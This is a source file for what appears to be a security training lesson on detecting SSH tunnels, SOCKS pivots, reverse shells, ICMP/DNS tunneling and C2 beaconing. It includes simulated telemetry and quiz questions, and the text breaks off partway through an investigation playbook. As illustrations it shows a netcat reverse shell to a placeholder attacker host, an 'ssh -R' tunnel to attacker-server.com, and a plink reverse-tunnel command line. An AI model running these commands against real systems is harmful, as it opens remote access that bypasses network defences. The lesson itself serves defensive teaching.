/**
 * Learning Rooms — Batch 17 (Room 6)
 *
 * "Tunneling, Proxies & C2 Channels" (tunneling-c2-channels)
 *
 * Advanced deep dive into tunneling and covert channels: SSH local/remote/
 * dynamic port forwarding, SOCKS proxies, reverse shells, ICMP and DNS
 * tunneling mechanics, HTTP(S) beaconing math (interval + jitter), and
 * living-off-the-land tunneling tools (ngrok, Chisel, plink) with their
 * detection fields.
 */

import type { TelemetryEvent } from "@/lib/sim/types";

// ── Log analysis event 1: plink.exe reverse SSH tunnel process creation ─────
const plinkReverseTunnelEvent: TelemetryEvent = {
  id: "evt-tunnel-la1-001",
  ts: "2026-07-01T22:14:09.000Z",
  source: "sysmon",
  vendor: "Microsoft Sysmon",
  event_type: "process_create",
  severity: "high",
  hostname: "SRV-APP12.solvix.local",
  process: {
    name: "plink.exe",
    pid: 6120,
    path: "C:\\Users\\svc_report\\AppData\\Local\\Temp\\plink.exe",
    parent_name: "cmd.exe",
    parent_pid: 4488,
    cmdline: "plink.exe -ssh -N -R 3389:127.0.0.1:3389 -P 443 -l relay -pw ******** 45.83.219.11",
    user: "SOLVIX\\svc_report",
    integrity: "medium",
  },
  dst_ip: "45.83.219.11",
  dst_port: 443,
  protocol: "tcp",
  description:
    "SRV-APP12 spawned plink.exe, the PuTTY command-line SSH client, from a user Temp folder with a remote port-forward command line",
  raw: {
    "winlog.event_id": 1,
    "winlog.provider_name": "Microsoft-Windows-Sysmon",
    "winlog.event_data.UtcTime": "2026-07-01 22:14:09.000",
    "winlog.event_data.ProcessId": 6120,
    "winlog.event_data.Image": "C:\\Users\\svc_report\\AppData\\Local\\Temp\\plink.exe",
    "winlog.event_data.Product": "PuTTY suite",
    "winlog.event_data.Company": "Simon Tatham",
    "winlog.event_data.OriginalFileName": "Plink",
    "winlog.event_data.CommandLine":
      "plink.exe -ssh -N -R 3389:127.0.0.1:3389 -P 443 -l relay -pw ******** 45.83.219.11",
    "winlog.event_data.CurrentDirectory": "C:\\Users\\svc_report\\AppData\\Local\\Temp\\",
    "winlog.event_data.User": "SOLVIX\\svc_report",
    "winlog.event_data.IntegrityLevel": "Medium",
    "winlog.event_data.Hashes": "SHA256=0FEFA5D85E2CC9F24584A763E6F49790F562FDD7B26C82E770212CD1CC91E6F5",
    "winlog.event_data.ParentProcessId": 4488,
    "winlog.event_data.ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "winlog.event_data.ParentCommandLine": "cmd.exe /c plink.exe -ssh -N -R 3389:127.0.0.1:3389 -P 443 -l relay -pw ******** 45.83.219.11",
  },
};

// ── Log analysis event 2: TLS beacon to ngrok-style tunneling infra ─────────
const ngrokBeaconEvent: TelemetryEvent = {
  id: "evt-tunnel-la2-001",
  ts: "2026-07-03T18:02:30.000Z",
  source: "proxy",
  vendor: "Zscaler Internet Access",
  event_type: "net_connection",
  severity: "high",
  hostname: "SRV-DB07.solvix.local",
  src_ip: "10.40.2.201",
  dst_ip: "3.15.44.88",
  dst_port: 443,
  protocol: "tcp",
  network: { domain: "8f2a9c1e.ngrok-free.app" },
  description:
    "SRV-DB07, a production database server, has established 58 TLS sessions to 8f2a9c1e.ngrok-free.app over the past 59 minutes",
  raw: {
    "tls.sni": "8f2a9c1e.ngrok-free.app",
    "destination.ip": "3.15.44.88",
    "destination.port": 443,
    "network.protocol": "https",
    connections_last_hour: 58,
    interval_seconds_avg: 61.2,
    interval_seconds_stddev: 6.8,
    bytes_out_avg_per_connection: 412,
    bytes_in_avg_per_connection: 388,
    process_hint: "sqlservr.exe",
    dst_asn_org: "AMAZON-02",
  },
};

const tunnelingRoom = {
  id: "tunneling-c2-channels",
  title: "Tunneling, Proxies & C2 Channels",
  description:
    "Learn to recognize covert channels the way an analyst investigating an active intrusion actually finds them: SSH local/remote/dynamic port forwarding and what each looks like on the wire, SOCKS proxy pivoting and reverse shells, ICMP and DNS tunneling mechanics, the exact math behind HTTP(S) beacon interval and jitter, and why attackers increasingly prefer legitimate, signed living-off-the-land tools like ngrok, Chisel, and plink over custom malware — plus how to tell dual-use tooling used maliciously apart from the same tools used for approved IT work.",
  difficulty: "advanced" as const,
  category: "Network Security" as const,
  estimatedMinutes: 70,
  xp: 410,
  icon: "🕳️",
  prerequisites: ["tcpip-deep-dive", "dns-deep-dive"],
  tasks: [
    // ── Reading 1: SSH port forwarding ────────────────────────────────────────
    {
      type: "reading" as const,
      id: "tunnel-r1",
      heading: "SSH Port Forwarding: Local, Remote, and Dynamic (SOCKS)",
      content:
        `SSH is not just a remote shell protocol — its connection can carry arbitrary additional TCP traffic through the same encrypted tunnel, using three distinct forwarding modes that every analyst needs to be able to recognize by their command-line syntax alone, because that syntax is exactly what shows up in process-creation telemetry.\n\n` +
        `**Local forwarding (-L): expose a REMOTE service on your LOCAL machine**\n\n` +
        `ssh -L 8080:internal-app:80 jumpbox.example.com opens a listener on YOUR local port 8080; anything you connect to on 127.0.0.1:8080 gets tunneled, through the SSH connection to jumpbox.example.com, and from there out to internal-app:80. This is the common, everyday, legitimate use case: reaching an internal service you don't have direct network access to, via an SSH jump host you do have access to. Attackers use it too — most often to reach an internal target from their own attacker-controlled machine, tunneling through a single compromised host that DOES have the needed network access.\n\n` +
        `**Remote forwarding (-R): expose a LOCAL service to the REMOTE side — the dangerous direction**\n\n` +
        `ssh -R 3389:127.0.0.1:3389 attacker-server.com does the reverse: it opens a listener on the REMOTE machine (attacker-server.com), and anything connecting to THAT remote listener gets tunneled back through the SSH connection to 127.0.0.1:3389 on the machine that initiated the SSH connection. This is exactly the mechanism behind a reverse tunnel: an internal, compromised host initiates a normal-looking OUTBOUND SSH connection (which most firewalls permit far more readily than inbound connections), and once established, the attacker — sitting on the remote end — can now reach back INTO the internal network through that tunnel, entirely bypassing whatever inbound firewall rules would otherwise have blocked them. The internal host effectively phones home and hands the attacker a door that opens from the outside, without ever requiring an inbound connection to be allowed anywhere.\n\n` +
        `**Dynamic forwarding (-D): turn the SSH client into a full SOCKS proxy**\n\n` +
        `ssh -D 1080 jumpbox.example.com doesn't forward one specific port at all — it turns the local machine into a SOCKS proxy listening on port 1080. Any application configured to use that SOCKS proxy (a browser, or, notably, an attacker's own tooling configured via proxychains) can now reach ANY destination reachable from jumpbox.example.com, on ANY port, all tunneled through the single encrypted SSH connection. This is the most flexible and most dangerous mode for an attacker pivoting through a compromised host: rather than pre-selecting one specific service to forward (as -L and -R require), -D gives them arbitrary, on-demand access to the entire network reachable from that pivot point.\n\n` +
        `**Why the network evidence looks almost identical regardless of forwarding mode**\n\n` +
        `From a pure flow-log perspective, all three modes look like exactly what they are at the transport layer: one long-lived, encrypted TCP connection on port 22 (or, as covered later in this room, sometimes a non-standard port chosen deliberately to blend in). The forwarding TYPE and DIRECTION are not visible in the flow record at all — this is exactly why process-creation telemetry (the actual command line used to invoke ssh or plink, which explicitly states -L, -R, or -D and the exact ports involved) is essential to fully understand what a suspicious long-lived SSH connection is actually being used for.`,
      codeExample:
        "SSH FORWARDING MODES -- SYNTAX AND DIRECTION\n" +
        "=======================================================\n" +
        "-L (local forward)\n" +
        "  ssh -L 8080:internal-app:80 jumpbox.example.com\n" +
        "  Local:8080 --tunnel--> jumpbox --> internal-app:80\n" +
        "  Use: reach a REMOTE service from HERE\n" +
        "\n" +
        "-R (remote forward) -- THE DANGEROUS DIRECTION\n" +
        "  ssh -R 3389:127.0.0.1:3389 attacker-server.com\n" +
        "  attacker-server:3389 --tunnel--> HERE:127.0.0.1:3389\n" +
        "  Use: expose a LOCAL service to a REMOTE listener --\n" +
        "  attacker reaches INTO your network via an outbound-\n" +
        "  initiated connection, bypassing inbound firewall rules\n" +
        "\n" +
        "-D (dynamic / SOCKS proxy)\n" +
        "  ssh -D 1080 jumpbox.example.com\n" +
        "  Turns local machine into a SOCKS proxy on port 1080 --\n" +
        "  ANY app/tool can now reach ANY destination reachable\n" +
        "  from jumpbox, over ANY port, through one SSH tunnel\n" +
        "=======================================================\n\n" +
        "WHAT THE FLOW LOG SHOWS REGARDLESS OF MODE\n" +
        "=======================================================\n" +
        "One long-lived, encrypted TCP connection on port 22 (or a\n" +
        "chosen alternate port). Forwarding TYPE and DIRECTION are\n" +
        "invisible at the flow layer -- process-creation telemetry\n" +
        "(the actual command line) is what reveals -L vs -R vs -D.\n" +
        "=======================================================",
      checkpoint: {
        question:
          "A process-creation event on a workstation shows the command line 'ssh -D 1080 jumpbox.example.com'. What has this command set up?",
        options: [
          "A listener on jumpbox.example.com that relays incoming connections back to port 1080 on the workstation",
          "A SOCKS proxy on the workstation's port 1080 that reaches any host and port reachable from the jumpbox",
          "A listener on the workstation's port 1080 that forwards to one fixed service behind the jumpbox",
          "A tunnel that relays only the workstation's DNS lookups through the jumpbox on port 1080",
        ],
        answer: 1,
        explanation:
          "-D turns the local machine (here, the workstation) into a SOCKS proxy on the given port rather than forwarding one specific port, so any application pointed at it can reach any destination reachable from the jumpbox, on any port. A listener on the jumpbox relaying back to the workstation describes -R, not -D. A local listener forwarding to one fixed service behind the jumpbox is -L, which needs a fixed host:port target in its syntax. Relaying only DNS lookups is not what -D does — it carries arbitrary TCP connections, not just name resolution.",
      },
    },

    // ── Reading 2: SOCKS proxies and reverse shells ───────────────────────────
    {
      type: "reading" as const,
      id: "tunnel-r2",
      heading: "SOCKS Proxies and Reverse Shells",
      content:
        `**SOCKS: a protocol-agnostic relay**\n\n` +
        `A SOCKS proxy (versions 4 and 5, with 5 adding authentication and UDP support) is deliberately simple: a client connects to the SOCKS proxy and requests "relay my traffic to destination X, port Y" — the proxy then relays raw TCP (or, in SOCKS5, UDP) bytes back and forth, with no understanding of or interest in what protocol is actually being carried inside. This protocol-agnosticism is exactly what makes SOCKS so useful for pivoting: once an attacker has a SOCKS proxy running through a compromised host (via SSH -D, as covered above, or via a dedicated proxy tool), they can point ANY of their own tooling — a port scanner, a web browser, an exploitation framework, credential-harvesting tools — at that SOCKS proxy and have it reach deep into the target's internal network as if the attacker's own machine were sitting inside it, without needing to write any custom malware to do so. Tools like proxychains transparently redirect an existing application's network traffic through a configured SOCKS proxy without that application needing any built-in proxy support at all.\n\n` +
        `**Chaining SOCKS proxies for multi-hop pivoting**\n\n` +
        `Attackers frequently chain multiple SOCKS hops together (compromise host A, pivot via A's SOCKS proxy to reach and compromise host B deeper in the network, establish a SECOND SOCKS proxy through B, and so on) — each additional hop makes the traffic's true origin progressively harder to trace purely from network logs at any single point, since each hop only ever sees its own immediate predecessor and successor, not the full chain.\n\n` +
        `**Bind shells vs. reverse shells**\n\n` +
        `A shell payload gives an attacker interactive command execution on a compromised host, and comes in two structural flavors. A **bind shell** has the compromised host itself open a listening port and wait for the attacker to connect INTO it — simple, but requires an INBOUND connection to reach the victim, which most modern firewalls (correctly configured to block unsolicited inbound traffic) will block outright, making bind shells largely impractical against any reasonably defended target. A **reverse shell** flips the direction: the compromised host itself initiates an OUTBOUND connection back to attacker-controlled infrastructure, which then hands back an interactive shell over that connection. Because outbound connections are, in most environments, permitted far more liberally than inbound ones (users need to browse the web, applications need to reach APIs), reverse shells are overwhelmingly the more common and more successful approach — this is the exact same "outbound is trusted more than inbound" asymmetry that makes SSH remote forwarding (-R) so effective, and it's the single most consistent theme across nearly every tunneling and pivoting technique in this room.\n\n` +
        `**What this looks like in a flow log**\n\n` +
        `A classic netcat-style reverse shell (nc -e /bin/bash attacker_ip 4444, or the fileless PowerShell/Python equivalents that avoid a literal -e flag but accomplish the same thing) produces a connection with a distinctive shape: NOT a clean, protocol-conforming HTTP/TLS/SSH negotiation at all if run in its simplest raw-netcat form, a genuinely interactive, irregular byte pattern over time (bursts corresponding to individual commands typed and their output, rather than either a clean request/response HTTP shape or a steady, high-volume bulk-transfer shape), and — often — a listener/connection on a port with no legitimate registered service association at all (4444 is the long-standing, extremely well-known default Metasploit listener port specifically because it was never claimed by any standard service). More sophisticated reverse shells deliberately wrap themselves in legitimate-looking HTTPS traffic specifically to blend in and avoid exactly this kind of raw-protocol fingerprinting — which is exactly why the beaconing-math and living-off-the-land-tooling readings later in this room matter as much as recognizing a raw, unencrypted reverse shell does.`,
      codeExample:
        "BIND SHELL vs REVERSE SHELL -- WHY REVERSE WINS\n" +
        "=======================================================\n" +
        "BIND SHELL\n" +
        "  Victim listens -> Attacker connects IN\n" +
        "  Requires an INBOUND connection to reach the victim --\n" +
        "  blocked by nearly any reasonably configured firewall\n" +
        "\n" +
        "REVERSE SHELL\n" +
        "  Victim connects OUT -> Attacker's listener receives it\n" +
        "  Requires only an OUTBOUND connection -- permitted far\n" +
        "  more liberally in almost every real environment\n" +
        "=======================================================\n\n" +
        "CLASSIC RAW NETCAT REVERSE SHELL\n" +
        "=======================================================\n" +
        "Victim runs:  nc -e /bin/bash attacker_ip 4444\n" +
        "  -> outbound TCP to attacker_ip:4444\n" +
        "  -> port 4444 has no standard registered service\n" +
        "     (the long-standing default Metasploit listener port)\n" +
        "  -> irregular, bursty byte pattern (interactive typing +\n" +
        "     command output), not a clean protocol negotiation\n" +
        "     or steady bulk-transfer shape\n" +
        "=======================================================\n\n" +
        "SOCKS PROXY CHAINING FOR MULTI-HOP PIVOTING\n" +
        "=======================================================\n" +
        "Attacker -> SOCKS via Host A -> Host B (new pivot) ->\n" +
        "  SOCKS via Host B -> Host C -> ...\n" +
        "  Each hop only sees its own immediate predecessor/\n" +
        "  successor -- true origin gets harder to trace at any\n" +
        "  single observation point as the chain grows\n" +
        "=======================================================",
      checkpoint: {
        question:
          "An attacker can run commands on a web server behind a typical corporate firewall and must choose a shell payload. Why is a reverse shell more likely to succeed than a bind shell?",
        options: [
          "A reverse shell encrypts its session by default, while a bind shell sends commands in cleartext that IDS can flag",
          "The victim dials out, and egress traffic is filtered far more loosely than unsolicited inbound connections",
          "A reverse shell listens on an unregistered port such as 4444, which the firewall has no rule to inspect",
          "A bind shell needs the attacker's own machine to accept inbound connections, which their NAT router blocks",
        ],
        answer: 1,
        explanation:
          "A reverse shell has the compromised host initiate an outbound connection, and most environments permit outbound traffic far more liberally than unsolicited inbound traffic — the same asymmetry that makes SSH -R effective. Encryption is not what separates the two: a raw netcat reverse shell is unencrypted. Port 4444 is the attacker's listener, not something the victim listens on, and an unregistered port does not slip past a firewall. The NAT option reverses the direction: a bind shell needs the VICTIM to accept an inbound connection, which is exactly what the corporate firewall blocks.",
      },
    },

    // ── Reading 3: ICMP/DNS tunneling mechanics ────────────────────────────────
    {
      type: "reading" as const,
      id: "tunnel-r3",
      heading: "ICMP and DNS Tunneling Mechanics, Revisited for Throughput and Detection",
      content:
        `You've already covered DNS tunneling's statistical detection in depth in an earlier room; here the focus is the mechanics of ICMP tunneling specifically, paired with a throughput-focused recap of DNS tunneling's practical constraints — both matter because they represent the two most heavily "allowed by default" protocols an attacker can hide inside.\n\n` +
        `**ICMP tunneling: hiding data in a protocol built for control messages, not payload**\n\n` +
        `ICMP echo request/reply (what ping uses) technically permits an arbitrary-length, arbitrary-content data payload in each packet — normally, this payload is just fixed padding bytes (a standard Windows ping sends a recognizable, repeating 32-byte alphabetic pattern; a standard Linux/Unix ping sends a recognizable, incrementing 48- or 56-byte pattern) that no real application ever reads or cares about. ICMP tunneling tools (icmpsh, ptunnel, and similar) abuse exactly this unused capacity: they encode arbitrary command/response data — shell commands, file contents, C2 instructions — directly inside that payload field, using ICMP echo request/reply pairs as the transport, riding on a protocol that firewalls very commonly permit outbound by default for basic network diagnostics.\n\n` +
        `**Detecting ICMP tunneling**\n\n` +
        `The tells are almost entirely about the payload not matching what a real ping utility ever produces: payload SIZE that's unusually large (real diagnostic pings rarely exceed 64-128 bytes; tunneled data pushing payloads toward the practical maximum, or showing wildly inconsistent sizes packet to packet as different amounts of data get sent, is anomalous) or payload CONTENT that doesn't match either OS's standard fixed pattern at all (real ping payloads are boringly predictable and repetitive; tunneled data looks like arbitrary binary or text, changing meaningfully between packets rather than repeating). An unusually HIGH RATE of ICMP echo requests to a single external host — far beyond what any legitimate connectivity troubleshooting session would ever generate — is the other major signal, mirroring the volume-based logic from DNS tunneling detection.\n\n` +
        `**DNS tunneling: throughput constraints worth internalizing**\n\n` +
        `Beyond the statistical signals covered previously, it's worth understanding WHY DNS tunneling behaves the way it does: each individual DNS query/response round trip carries only a small amount of usable payload (tens of bytes to perhaps a couple hundred, depending on record type and encoding overhead), and each round trip has real latency (a full resolution can take anywhere from single-digit milliseconds to significantly longer depending on the path). This means DNS tunneling's realistic sustained throughput ranges from a few kilobytes per minute for cautious low-and-slow implants up to several kilobytes per second for tuned tools such as iodine using large NULL records — at best on the order of tens of megabytes per hour, genuinely usable for C2 command-and-control traffic (small commands, small responses) and slow, patient data exfiltration, but fundamentally impractical for moving large files quickly. This throughput ceiling is itself a useful piece of context: if you're investigating a suspected large, fast data exfiltration event, DNS tunneling is a poor mechanical fit for that specific characteristic, and the investigation should look elsewhere (a large upload-shaped TCP flow, or a fast HTTP(S) POST) — while a slow, patient, long-duration low-volume channel is exactly DNS tunneling's comfort zone.`,
      codeExample:
        "STANDARD PING PAYLOADS vs TUNNELED ICMP PAYLOADS\n" +
        "=======================================================\n" +
        "Windows ping default payload (32 bytes, repeating):\n" +
        "  abcdefghijklmnopqrstuvwabcdefghi\n" +
        "\n" +
        "Linux/Unix ping default payload (48-56 bytes, incrementing\n" +
        "  byte sequence 0x08, 0x09, 0x0a, 0x0b, ...)\n" +
        "\n" +
        "Tunneled ICMP payload:\n" +
        "  Variable size packet-to-packet, arbitrary binary/text\n" +
        "  content that changes meaningfully between packets --\n" +
        "  matches NEITHER OS's standard fixed pattern\n" +
        "=======================================================\n\n" +
        "ICMP TUNNELING DETECTION SIGNALS\n" +
        "=======================================================\n" +
        "[ ] Payload size unusually large or inconsistent packet-\n" +
        "    to-packet (real diagnostic pings: small and constant)\n" +
        "[ ] Payload content doesn't match either OS's fixed,\n" +
        "    repeating standard pattern\n" +
        "[ ] High rate of echo requests to one external host, far\n" +
        "    beyond normal troubleshooting volume\n" +
        "=======================================================\n\n" +
        "DNS TUNNELING THROUGHPUT REALITY CHECK\n" +
        "=======================================================\n" +
        "Per round trip:  tens to ~hundreds of usable payload bytes\n" +
        "Realistic sustained throughput: a few KB/minute up to a\n" +
        "  few KB/second (tuned tools) -- tens of MB/hour at best\n" +
        "  -> fits: small C2 commands, slow patient exfiltration\n" +
        "  -> does NOT fit: large/fast file exfiltration (look for\n" +
        "     an upload-shaped TCP flow or fast HTTP(S) POST instead)\n" +
        "=======================================================",
    },

    // ── Reading 4: HTTP(S) beaconing math ──────────────────────────────────────
    {
      type: "reading" as const,
      id: "tunnel-r4",
      heading: "HTTP(S) Beaconing Math: Interval, Jitter, and Statistical Detection",
      content:
        `Command-and-control frameworks almost universally use a "sleep and check in" model rather than maintaining a constant, always-on connection — both to minimize their network footprint and to reduce the chance of looking like a persistent, actively-monitored session. Understanding the exact math behind this lets you detect it even when the operator has deliberately tried to hide the pattern.\n\n` +
        `**Interval: the base sleep time**\n\n` +
        `The beacon's operator configures a **sleep interval** (commonly measured in seconds) — how long the implant waits between each check-in to its C2 server. A naive, un-jittered beacon checking in every exactly 60 seconds produces a trivially detectable pattern: plot the time gaps between successive connections to the same destination, and every single gap is (as close to) precisely 60 seconds as network latency allows.\n\n` +
        `**Jitter: randomizing within a band, not eliminating the pattern**\n\n` +
        `**Jitter** is configured as a percentage that randomizes the actual sleep time around the base interval — a 60-second interval with 20% jitter means each individual sleep is randomly chosen somewhere between 48 seconds (60 minus 20%) and 72 seconds (60 plus 20%), a different random value each time. (Jitter semantics vary by framework: this room uses the symmetric ± convention, but Cobalt Strike, for example, only subtracts — sleep 60 with 20% jitter gives 48–60 seconds — and some frameworks add a random delay on top of the base instead, so confirm the convention before computing a band.) This defeats naive "are all the gaps EXACTLY 60 seconds" detection — but it does NOT make the beacon's timing look like genuinely random human activity, because jitter only randomizes WITHIN a fixed, bounded band. Every single gap, no matter how the random draw comes out, still falls somewhere between 48 and 72 seconds — it can never be 10 seconds, and it can never be 300 seconds, the way genuinely unstructured human browsing behavior naturally would produce.\n\n` +
        `**The statistical detection: deltas cluster in a band, real activity doesn't**\n\n` +
        `An analyst (or an automated tool like RITA, built specifically for this) computes the **inter-arrival deltas** — the time gap between each successive connection from one host to the same destination — across a large enough sample, then looks at the SHAPE of that distribution. A beacon with interval=60/jitter=20% produces deltas that are tightly and evenly clustered somewhere in the 48-72 second band, session after session, hour after hour, essentially indefinitely, for as long as the implant stays alive. Ordinary human-driven traffic to any single destination — even a site someone visits very habitually — does not produce this kind of persistent, bounded clustering; human timing is influenced by actual activity, breaks, meetings, and simple inattention, producing deltas that are far more varied and don't sit in one tight, unchanging band indefinitely.\n\n` +
        `**Worked example**\n\n` +
        `Given ten observed connection timestamps to one destination, compute the nine gaps between them. If every one of those nine gaps falls between 48 and 72 seconds, with no gap dramatically outside that range, and this pattern continues consistently across a much longer observation window (hours, not just ten samples), that is a very high-confidence beacon signature — because the ONLY realistic non-malicious explanation for that kind of sustained, bounded regularity is some form of legitimate, genuinely scheduled automated task (an update checker, a telemetry client, a license-validation service) — which is exactly why destination reputation and process attribution (covered in the TLS room's C2 detection reading) still matter as the final piece of the puzzle even after the timing math checks out.\n\n` +
        `**Beacon "score" as a concept**\n\n` +
        `Detection tools formalize this into a beacon score: a composite metric weighing how tightly deltas cluster (low variance relative to the mean = higher score), how many repetitions have been observed (more repetitions = more statistical confidence), and how consistent the data-size-per-connection is (as covered in the TLS room). A single pair of connections 60 seconds apart proves nothing; dozens of connections sustaining a tight, bounded interval over hours is what turns a coincidence into a confident detection.`,
      codeExample:
        "WORKED EXAMPLE: interval=60s, jitter=20% -> band = 48-72s\n" +
        "=======================================================\n" +
        "Ten observed connection timestamps (seconds elapsed):\n" +
        "  0, 63, 119, 184, 231, 296, 349, 411, 462, 527\n" +
        "\n" +
        "Nine deltas between them:\n" +
        "  63, 56, 65, 47, 65, 53, 62, 51, 65\n" +
        "\n" +
        "Check against the 48-72s expected band:\n" +
        "  63 OK   56 OK   65 OK   47 *just under*   65 OK\n" +
        "  53 OK   62 OK   51 OK   65 OK\n" +
        "\n" +
        "  8 of 9 deltas land cleanly inside the band; the one\n" +
        "  borderline value (47) is consistent with network jitter\n" +
        "  ON TOP of the beacon's own configured jitter. This tight\n" +
        "  clustering, sustained over many samples, is the beacon\n" +
        "  signature -- genuine human browsing would NOT produce\n" +
        "  nine deltas this consistently bounded.\n" +
        "=======================================================\n\n" +
        "BEACON SCORE -- WHAT FEEDS INTO IT\n" +
        "=======================================================\n" +
        "[+] Low variance of deltas relative to the mean interval\n" +
        "[+] High repetition count (more samples = more confidence)\n" +
        "[+] Consistent bytes-per-connection (from the TLS room)\n" +
        "[+] Rare/first-seen or low-reputation destination\n" +
        "One or two matching connections: coincidence.\n" +
        "Dozens, sustained over hours: high-confidence beacon.\n" +
        "=======================================================",
      checkpoint: {
        question:
          "An operator raises a beacon's jitter from 0% to 20% to evade timing detection. Why can a delta-clustering analysis still separate it from human browsing to the same site?",
        options: [
          "Each sleep is drawn from a bounded band around the base, so the gaps never spread as widely as human timing does",
          "Jitter randomizes packet sizes, not timing, so every gap between check-ins still equals the configured base interval",
          "The random offsets average to zero, so over a long sample the individual gaps converge on exactly the base value",
          "Human browsing to one site is more regular than any jittered beacon, so the beacon's wider spread is what stands out",
        ],
        answer: 0,
        explanation:
          "Jitter only randomizes each sleep within a bounded band around the base interval (48–72 seconds for 60 s with symmetric 20% jitter), so the gaps keep clustering inside that band indefinitely, while human timing ranges from seconds to hours. Jitter acts on the sleep time, not on packet sizes, so the gaps do vary. The offsets may average out, but averaging does not make individual gaps equal the base — each gap still lands anywhere in the band. Human browsing is the less regular of the two, not the more regular, so it is the beacon's tight band, not a wide spread, that gives it away.",
      },
    },

    // ── Reading 5: LOLBin tunneling tools ────────────────────────────────────
    {
      type: "reading" as const,
      id: "tunnel-r5",
      heading: "Living-off-the-Land Tunneling Tools: ngrok, Chisel, and plink",
      content:
        `Attackers increasingly favor legitimate, often digitally-signed, publicly-available tools over custom-built malware for exactly one reason: signature-based antivirus and simplistic allowlisting are far less likely to flag a well-known, legitimately-signed utility, and even when analysts do notice the tool running, its presence alone is genuinely ambiguous — plenty of legitimate IT and developer workflows use these same tools.\n\n` +
        `**ngrok: instant public tunnels via a trusted SaaS provider**\n\n` +
        `ngrok is a legitimate, widely-used developer tool that creates a public, internet-reachable HTTPS (or TCP) tunnel to a service running on a local/internal machine, entirely through ngrok's own cloud infrastructure — no port forwarding, no firewall changes, no public IP needed on the target's end at all. An attacker who has landed on an internal host can run the ngrok client to instantly expose an internal service (a web shell, an RDP session via a local proxy, a file share) to the public internet, or, in the other direction, establish an outbound tunnel back to infrastructure they control, entirely through what LOOKS like completely normal, legitimate SaaS traffic. The network fingerprint is distinctive once you know to look for it: TLS connections with an SNI matching ngrok's own domains (*.ngrok.io, *.ngrok-free.app, or a custom domain if the attacker has a paid ngrok plan), from a host that has no legitimate business reason to be reaching a consumer/developer tunneling SaaS product at all (a production database server, a domain controller, a finance file server) is a strong contextual anomaly, even though the traffic itself is genuinely encrypted, genuinely legitimate SaaS traffic from ngrok's own perspective.\n\n` +
        `**Chisel: a fast, Go-based TCP/UDP tunnel, often for SOCKS pivoting**\n\n` +
        `Chisel is an open-source tool (also legitimately used by penetration testers and some IT teams) that creates a tunnel over HTTP, with the server and client both compiled as small, portable, single-file binaries — making it trivially easy to drop onto a compromised host with no installation and no dependencies. Chisel is very commonly paired specifically with SOCKS proxy functionality, letting an attacker stand up a full network pivot through a single dropped binary rather than needing SSH access (which requires valid credentials and an SSH server already running) at all. Its network fingerprint rides on HTTP/HTTPS, and while its default configuration has some recognizable characteristics (a specific banner/handshake behavior at the start of a session), operators increasingly customize these specifically to evade signature-based detection — which is exactly why behavioral signals (an unfamiliar, recently-dropped binary establishing a long-lived outbound connection with beacon-like or pivot-like traffic shape) matter more than static signatures for this tool specifically.\n\n` +
        `**plink.exe: PuTTY's command-line SSH client, and why EDR often trusts it by default**\n\n` +
        `plink (PuTTY Link) is the command-line-only counterpart to the PuTTY SSH client — a small, digitally-signed, entirely legitimate Windows binary that system administrators have used for decades to script SSH connections and port forwards without needing an interactive terminal. Because it's so old, so widely deployed for entirely legitimate administrative scripting, and properly code-signed, many EDR/allowlisting policies either explicitly trust it or simply never flag it by default — which is precisely why attackers favor it specifically for scripting exactly the -L/-R/-D forwarding techniques from Reading 1 on Windows hosts, where a native SSH client historically wasn't always present. Seeing plink.exe launched from an unusual location (a temp directory rather than a standard admin toolkit path, as in this room's log analysis exercise), by an account or in a context with no history of using it, is the key behavioral differentiator — not the mere fact that plink.exe exists or ran at all.\n\n` +
        `**The common thread**\n\n` +
        `All three tools share the same appeal: legitimate, often signed, widely available, and genuinely dual-use — which means detection has to rely on CONTEXT (is this host/account/location one that has any business reason to run this tool at all), BEHAVIOR (connection duration, destination, traffic shape), and CORRELATION (does this coincide with other suspicious activity), rather than simply alerting on the tool's mere presence, which would produce constant false positives against legitimate administrative and developer use.`,
      codeExample:
        "LOLBIN TUNNELING TOOL -> LEGITIMATE USE -> ABUSE PATTERN\n" +
        "=======================================================\n" +
        "TOOL     LEGITIMATE USE          ABUSE PATTERN\n" +
        "-------------------------------------------------------\n" +
        "ngrok    Developers exposing a   Exfil/C2 tunnel via a\n" +
        "         local dev server for    trusted SaaS provider;\n" +
        "         demos/webhooks          SNI = *.ngrok.io /\n" +
        "                                 *.ngrok-free.app\n" +
        "\n" +
        "Chisel   Pentesters/some IT      Dropped single-file\n" +
        "         teams for authorized    binary, SOCKS pivot\n" +
        "         tunneling               over HTTP/HTTPS, no\n" +
        "                                 installation needed\n" +
        "\n" +
        "plink.exe Sysadmin SSH/port-     Scripted -L/-R/-D\n" +
        "         forward scripting,      forwarding on Windows,\n" +
        "         signed & often          often trusted by EDR/\n" +
        "         EDR-allowlisted         allowlisting by default\n" +
        "=======================================================\n\n" +
        "THE KEY DETECTION QUESTIONS FOR ANY DUAL-USE TOOL\n" +
        "=======================================================\n" +
        "1. Does this HOST/ACCOUNT have any business reason to\n" +
        "   run this tool at all?\n" +
        "2. Is the LOCATION it ran from normal (admin toolkit\n" +
        "   path) or anomalous (Temp, Downloads, user profile)?\n" +
        "3. Does the resulting CONNECTION behave normally (short,\n" +
        "   expected) or abnormally (long-lived, beacon-shaped,\n" +
        "   to an unexpected destination)?\n" +
        "=======================================================",
    },

    // ── Reading 6: investigation playbook ────────────────────────────────────
    {
      type: "reading" as const,
      id: "tunnel-r6",
      heading: "Putting It Together: A Tunneling Investigation Playbook",
      content:
        `Every technique in this room produces overlapping but distinguishable evidence across process, network, DNS, and TLS telemetry — this final reading is the checklist that ties them together into a repeatable investigation sequence.\n\n` +
        `**Step 1 — Process ancestry and command line**\n\n` +
        `Start at the endpoint if you have process telemetry available: what launched this connection, and what's the FULL command line? A bare "ssh" or "plink.exe" launch tells you little; the same launch WITH -R 3389:127.0.0.1:3389 visible in the command line tells you exactly what direction and what service is being forwarded, immediately. This single step is often the fastest way to fully understand what a suspicious long-lived connection actually is, and it's information that simply doesn't exist in network-only telemetry at all.\n\n` +
        `**Step 2 — Destination reputation and rarity**\n\n` +
        `Has this destination (IP, domain, or ASN) ever been contacted by any host on your network before? By how many hosts, and how often? A destination that's brand new to your entire environment, contacted by exactly one host, is a very different starting point than a destination your organization has used routinely for months.\n\n` +
        `**Step 3 — Connection duration and byte pattern**\n\n` +
        `Is this a short, transactional connection (consistent with a normal request/response) or an unusually long-lived one (consistent with an interactive tunnel or pivot session kept open for hours)? Is the byte pattern symmetric/bursty (interactive shell activity) or beacon-shaped (small, consistent, regularly repeating)?\n\n` +
        `**Step 4 — DNS and TLS metadata**\n\n` +
